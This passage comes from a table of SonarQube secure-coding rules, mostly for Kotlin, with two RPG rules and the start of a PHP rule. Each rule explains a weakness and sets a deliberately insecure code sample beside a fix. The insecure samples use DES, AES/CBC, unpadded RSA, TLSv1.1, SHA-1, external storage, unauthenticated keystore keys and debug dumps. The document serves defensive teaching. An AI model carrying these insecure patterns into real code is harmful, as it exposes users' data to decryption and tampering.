<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use internal storage whenever possible as the system prevents other apps from accessing this location. </li>
  <li> Only use external storage if you need to share non-sensitive files with other applications. </li>
  <li> If your application has to use the external storage to store sensitive data, make sure it encrypts the files using <a
  href="https://developer.android.com/reference/androidx/security/crypto/EncryptedFile">EncryptedFile</a>. </li>
  <li> Data coming from external storage should always be considered untrusted and should be validated. </li>
  <li> As some external storage can be removed, make sure to never store files on it that are critical for the usability of your application. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
import android.content.Context

class AccessExternalFiles {

    fun accessFiles(Context context) {
        context.getExternalFilesDir(null) // Sensitive
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.content.Context
import android.os.Environment

class AccessExternalFiles {

    fun accessFiles(Context context) {
        context.getFilesDir()
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">OWASP Top 10 2021 Category A4</a> - Insecure Design </li>
  <li> <a href="https://developer.android.com/privacy-and-security/security-tips#ExternalStorage">Android Security tips on external file storage</a>
  </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements">Mobile AppSec
  Verification Standard</a> - Data Storage and Privacy Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage">OWASP Mobile Top 10 2016 Category M2</a> - Insecure
  Data Storage </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/312">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S5547">
              kotlin:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection. </li>
  <li> Security during transmission or on storage devices. </li>
  <li> Data integrity, general trust, and authentication. </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Java Cryptographic Extension</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.crypto.NoSuchPaddingException
import java.security.NoSuchAlgorithmException
import javax.crypto.Cipher

fun main(args: Array&lt;String&gt;) {
    try {
        val des = Cipher.getInstance("DES") // Noncompliant
    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: NoSuchPaddingException) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import javax.crypto.NoSuchPaddingException
import java.security.NoSuchAlgorithmException
import javax.crypto.Cipher

fun main(args: Array&lt;String&gt;) {
    try {
        val aes = Cipher.getInstance("AES/GCM/NoPadding")
    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: NoSuchPaddingException) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/327">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S5542">
              kotlin:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest modes are CBC (Cipher Block Chaining) and ECB</p>
<p>(Electronic Codebook), as they are either vulnerable to padding oracles or do not provide authentication mechanisms.</p>
<p>And for RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Java Cryptographic Extension</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.crypto.Cipher
import javax.crypto.NoSuchPaddingException
import java.security.NoSuchAlgorithmException

fun main(args: Array&lt;String&gt;) {
    try {
        val aes = Cipher.getInstance("AES/CBC/PKCS5Padding"); // Noncompliant
    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: NoSuchPaddingException) {
        // ...
    }
}
</pre>
<p>Example with an asymmetric cipher, RSA:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
import javax.crypto.Cipher
import javax.crypto.NoSuchPaddingException
import java.security.NoSuchAlgorithmException

fun main(args: Array&lt;String&gt;) {
    try {
        val rsa = Cipher.getInstance("RSA/None/NoPadding"); // Noncompliant
    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: NoSuchPaddingException) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<p>For the AES symmetric cipher, use the GCM mode:</p>
<pre data-diff-id="1" data-diff-type="compliant">
import javax.crypto.Cipher
import javax.crypto.NoSuchPaddingException
import java.security.NoSuchAlgorithmException

fun main(args: Array&lt;String&gt;) {
    try {
        val aes = Cipher.getInstance("AES/GCM/NoPadding");
    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: NoSuchPaddingException) {
        // ...
    }
}
</pre>
<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>
<pre data-diff-id="2" data-diff-type="compliant">
import javax.crypto.Cipher
import javax.crypto.NoSuchPaddingException
import java.security.NoSuchAlgorithmException

fun main(args: Array&lt;String&gt;) {
    try {
        val rsa = Cipher.getInstance("RSA/ECB/OAEPWITHSHA-256ANDMGF1PADDING");
    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: NoSuchPaddingException) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: Use Galois/Counter mode (GCM)</h4>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul>
  <li> CCM: <code>Counter with CBC-MAC</code> </li>
  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>
  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>
  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>
  <li> OCB: <code>Offset Codebook Mode</code> </li>
</ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it</p>
<p>is considered more straightforward to use AES-GCM directly instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/327">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/327">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S4423">
              kotlin:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul>
  <li> SSL versions 1.0, 2.0 and 3.0 </li>
  <li> TLS versions 1.0 and 1.1 </li>
</ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Java Cryptographic Extension</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.net.ssl.SSLContext;
import java.security.NoSuchAlgorithmException;

fun main(args: Array&lt;String&gt;) {
    try {
        SSLContext.getInstance("TLSv1.1"); // Noncompliant
    } catch (e: NoSuchAlgorithmException) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import javax.net.ssl.SSLContext;
import java.security.NoSuchAlgorithmException;

fun main(args: Array&lt;String&gt;) {
    try {
        SSLContext.getInstance("TLSv1.2");
    } catch (e: NoSuchAlgorithmException) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/327">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/327">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S6288">
              kotlin:S6288
            </a>
          </td>
          <td>
            <details>
              <p>Android KeyStore is a secure container for storing key materials, in particular it prevents key materials extraction, i.e. when the application
process is compromised, the attacker cannot extract keys but may still be able to use them. It’s possible to enable an Android security feature, user
authentication, to restrict usage of keys to only authenticated users. The lock screen has to be unlocked with defined credentials
(pattern/PIN/password, biometric).</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application requires prohibiting the use of keys in case of compromise of the application process. </li>
  <li> The key material is used in the context of a highly sensitive application like a e-banking mobile app. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable user authentication (by setting <code>setUserAuthenticationRequired</code> to <code>true</code> during key generation)
to use keys for a limited duration of time (by setting appropriate values to <code>setUserAuthenticationValidityDurationSeconds</code>), after which
the user must re-authenticate.</p>
<h2>Sensitive Code Example</h2>
<p>Any users can use the key:</p>
<pre>
val keyGenerator: KeyGenerator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore")

var builder: KeyGenParameterSpec = KeyGenParameterSpec.Builder("test_secret_key", KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT) // Noncompliant
   .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
   .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
   .build()

keyGenerator.init(builder)
</pre>
<h2>Compliant Solution</h2>
<p>The use of the key is limited to authenticated users (for a duration of time defined to 60 seconds):</p>
<pre>
val keyGenerator: KeyGenerator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore")

var builder: KeyGenParameterSpec = KeyGenParameterSpec.Builder("test_secret_key", KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT)
   .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
   .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
   .setUserAuthenticationRequired(true) // Compliant
   .setUserAuthenticationParameters (60, KeyProperties.AUTH_DEVICE_CREDENTIAL)
   .build()

keyGenerator.init(builder)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">OWASP Top 10 2021 Category A4</a> - Insecure Design </li>
  <li> <a href="https://developer.android.com/privacy-and-security/keystore">developer.android.com</a> - Android keystore system </li>
  <li> <a href="https://developer.android.com/privacy-and-security/keystore#UserAuthentication">developer.android.com</a> - Require user
  authentication for key use </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements">Mobile AppSec
  Verification Standard</a> - Authentication and Session Management Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m4-insecure-authentication">OWASP Mobile Top 10 2016 Category M4</a> - Insecure
  Authentication </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/522">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S4790">
              kotlin:S4790
            </a>
          </td>
          <td>
            <details>
              <p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>
<p>The following APIs are tracked for use of obsolete crypto algorithms:</p>
<ul>
  <li> <code>java.security.AlgorithmParameters</code> (JDK) </li>
  <li> <code>java.security.AlgorithmParameterGenerator</code> (JDK) </li>
  <li> <code>java.security.MessageDigest</code> (JDK) </li>
  <li> <code>java.security.KeyFactory</code> (JDK) </li>
  <li> <code>java.security.KeyPairGenerator</code> (JDK) </li>
  <li> <code>java.security.Signature</code> (JDK) </li>
  <li> <code>javax.crypto.Mac</code> (JDK) </li>
  <li> <code>javax.crypto.KeyGenerator</code> (JDK) </li>
  <li> <code>org.apache.commons.codec.digest.DigestUtils</code> (Apache Commons Codec) </li>
  <li> <code>org.springframework.util.DigestUtils</code> </li>
  <li> <code>com.google.common.hash.Hashing</code> (Guava) </li>
  <li> <code>org.springframework.security.authentication.encoding.ShaPasswordEncoder</code> (Spring Security 4.2.x) </li>
  <li> <code>org.springframework.security.authentication.encoding.Md5PasswordEncoder</code> (Spring Security 4.2.x) </li>
  <li> <code>org.springframework.security.crypto.password.LdapShaPasswordEncoder</code> (Spring Security 5.0.x) </li>
  <li> <code>org.springframework.security.crypto.password.Md4PasswordEncoder</code> (Spring Security 5.0.x) </li>
  <li> <code>org.springframework.security.crypto.password.MessageDigestPasswordEncoder</code> (Spring Security 5.0.x) </li>
  <li> <code>org.springframework.security.crypto.password.NoOpPasswordEncoder</code> (Spring Security 5.0.x) </li>
  <li> <code>org.springframework.security.crypto.password.StandardPasswordEncoder</code> (Spring Security 5.0.x) </li>
</ul>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul>
  <li> User-password storage. </li>
  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>
  <li> To compute some message integrity. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too "quickly", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
val md1: MessageDigest = MessageDigest.getInstance("SHA");  // Sensitive:  SHA is not a standard name, for most security providers it's an alias of SHA-1
val md2: MessageDigest = MessageDigest.getInstance("SHA1");  // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
val md1: MessageDigest = MessageDigest.getInstance("SHA-512"); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/1240">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=rpg:S1628">
              rpg:S1628
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=rpg%3AS4507&rule_key=rpg%3AS4507'>S4507</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>The <code>DEBUG(*YES)</code> and <code>DUMP</code> statements are useful during development and debugging, but could expose sensitive information
to attackers and should not be included in production code.</p>
<h3>Noncompliant code example</h3>
<pre>
   H*-------------------------------------------------------------------------
   H   DATEDIT(*YMD) DEBUG(*YES)
   H**************************************************************************

   C     SR990         BegSR
   C     'CVTERR'      DUMP                                                   DUMP for error
   C                   Move      *on           *INLR
</pre>
<h3>Compliant solution</h3>
<pre>
   H*-------------------------------------------------------------------------
   H   DATEDIT(*YMD)
   H**************************************************************************

   C     SR990         BegSR
   C                   Move      *on           *INLR
</pre>
<h2>Resources</h2>
<ul>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/489">MITRE, CWE-489</a> - Active Debug Code </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=rpg:S4507">
              rpg:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>
  <li> The application runs by default with debug features activated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers.</p>
<p>The <code>DEBUG</code> and <code>DUMP</code> statements can expose sensitive information to attackers and should not be included in production
code.</p>
<h2>Sensitive Code Example</h2>
<pre>
   H*-------------------------------------------------------------------------
   H   DATEDIT(*YMD) DEBUG(*YES)
   H**************************************************************************

   C     SR990         BegSR
   C     'CVTERR'      DUMP                                                   DUMP for error
   C                   Move      *on           *INLR
</pre>
<h2>Compliant Solution</h2>
<pre>
   H*-------------------------------------------------------------------------
   H   DATEDIT(*YMD)
   H**************************************************************************

   C     SR990         BegSR
   C                   Move      *on           *INLR
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/489">MITRE, CWE-489</a> - Active Debug Code </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/215">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S3333">
              php:S3333
            </a>
          </td>
          <td>
            <details>
              <p>When accessing files on the local filesystem, PHP can enforce security checks to defend against some attacks. The <code>open_basedir</code> setting
in the main PHP configuration defines a set of directories that the application is allowed to access. Access to locations outside of these directories
will be blocked.</p>
<h2>Why is this an issue?</h2>
<p>The PHP runtime will allow the application to access all files underneath the configured set of directories. If no value is set, the application
may access any file on the filesystem.</p>
<h3>What is the potential impact?</h3>
<p><code>open_basedir</code> is commonly used to ensure that a PHP application can only access files needed for the application function. While
deactivating this setting does not pose a direct threat to the application’s security, it can make exploitation of other vulnerabilities easier and
more severe.</p>
<p>If an attacker can exploit a path traversal vulnerability, they will be able to access any file made available to the application’s user account.
This may include system-critical or otherwise sensitive files.</p>
<p>In shared hosting environments, a vulnerability can affect all co-hosted applications and not only the vulnerable one. <code>open_basedir</code>
can help limit the scope of the compromise in that case.</p>
<h2>How to fix it</h2>
<p>The main PHP configuration should define the <code>open_basedir</code> setting. This setting should not include overly large directories, such as
the root directory of the filesystem.</p>
<p>Adding the current directory, denoted by “.”, to the <code>open_basedir</code> configuration is also dangerous. It is possible to change the
current directory within PHP scripts by calling <code>chdir()</code>, effectively removing any protection.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
